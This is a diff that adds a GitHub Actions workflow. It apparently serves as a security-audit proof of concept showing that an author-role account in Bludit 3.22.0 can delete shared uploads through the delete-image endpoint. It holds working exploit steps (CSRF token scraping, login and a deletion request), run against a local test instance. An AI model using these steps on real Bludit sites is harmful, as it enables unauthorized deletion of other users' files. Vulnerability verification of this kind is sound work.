@@ -1,0 +1,84 @@
+name: Bludit 3.22.0 shared upload authorization proof
+on:
+  push:
+    branches:
+      - security-audit/bludit-live-test
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          repository: bludit/bludit
+          ref: 3.22.0
+          path: bludit
+      - uses: shivammathur/setup-php@v2
+        with:
+          php-version: '8.3'
+          extensions: gd, mbstring, xml, zip, fileinfo
+          coverage: none
+      - name: Test author deletion of shared upload
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat >/tmp/router.php <<'PHP'
+          <?php
+          $root=getenv('BLUDIT_ROOT');
+          $path=parse_url($_SERVER['REQUEST_URI'],PHP_URL_PATH);
+          if($path!=='/' && is_file($root.$path)) return false;
+          $_SERVER['DOCUMENT_ROOT']=$root;
+          $_SERVER['SCRIPT_NAME']='/index.php';
+          $_SERVER['PHP_SELF']='/index.php';
+          require $root.'/index.php';
+          PHP
+          export BLUDIT_ROOT="$GITHUB_WORKSPACE/bludit"
+          BASE='http://127.0.0.1:8080'
+          php -S 127.0.0.1:8080 -t "$BLUDIT_ROOT" /tmp/router.php >/tmp/server.log 2>&1 &
+          for i in $(seq 1 30); do curl -sS "$BASE/install.php" >/dev/null 2>&1 && break; sleep 1; done
+          curl -fsS "$BASE/install.php?demo=true" >/dev/null
+          php -r '$p="bludit/bl-content/databases/users.php"; $s=file_get_contents($p); $i=strpos($s,"?>"); $pre=substr($s,0,$i+2); $d=json_decode(substr($s,$i+2),true); $d["admin"]["role"]="author"; file_put_contents($p,$pre.PHP_EOL.json_encode($d,JSON_PRETTY_PRINT));'
+          jar=/tmp/author.jar
+          curl -sS -c "$jar" -b "$jar" "$BASE/admin/login" -o /tmp/login.html
+          csrf="$(python3 - <<'PY'
+          import re
+          s=open('/tmp/login.html',encoding='utf-8',errors='ignore').read()
+          m=re.search(r'name=["\']tokenCSRF["\'][^>]*value=["\']([^"\']+)',s)
+          if not m: m=re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']tokenCSRF["\']',s)
+          print(m.group(1) if m else '')
+          PY
+          )"
+          test -n "$csrf"
+          code="$(curl -sS -o /tmp/login-post.html -w '%{http_code}' -c "$jar" -b "$jar" --data-urlencode 'username=admin' --data-urlencode 'password=demo123' --data-urlencode "tokenCSRF=$csrf" "$BASE/admin/login")"
+          echo "Author-role login response: $code"
+          [[ "$code" == "301" || "$code" == "302" ]]
+          curl -sS -b "$jar" "$BASE/admin/new-content" -o /tmp/new-content.html
+          csrf="$(python3 - <<'PY'
+          import re
+          s=open('/tmp/new-content.html',encoding='utf-8',errors='ignore').read()
+          m=re.search(r'name=["\']tokenCSRF["\'][^>]*value=["\']([^"\']+)',s)
+          if not m: m=re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']tokenCSRF["\']',s)
+          print(m.group(1) if m else '')
+          PY
+          )"
+          test -n "$csrf" || { echo 'No author CSRF token'; exit 1; }
+          printf 'synthetic shared upload' >"$BLUDIT_ROOT/bl-content/uploads/audit-shared-delete.txt"
+          code="$(curl -sS -o /tmp/delete.json -w '%{http_code}' -b "$jar" -c "$jar" -X POST --data-urlencode "tokenCSRF=$csrf" --data-urlencode 'filename=audit-shared-delete.txt' "$BASE/admin/ajax/delete-image")"
+          echo "Author deletion response: $code"
+          cat /tmp/delete.json
+          if [[ "$code" == "200" && ! -e "$BLUDIT_ROOT/bl-content/uploads/audit-shared-delete.txt" ]]; then
+            echo 'CONFIRMED: author role deleted shared global upload on Bludit 3.22.0'
+          else
+            echo 'NOT REPRODUCED'
+            exit 1
+          fi
+      - name: Evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: bludit-3.22.0-shared-upload-proof
+          path: /tmp/server.log
+          if-no-files-found: warn
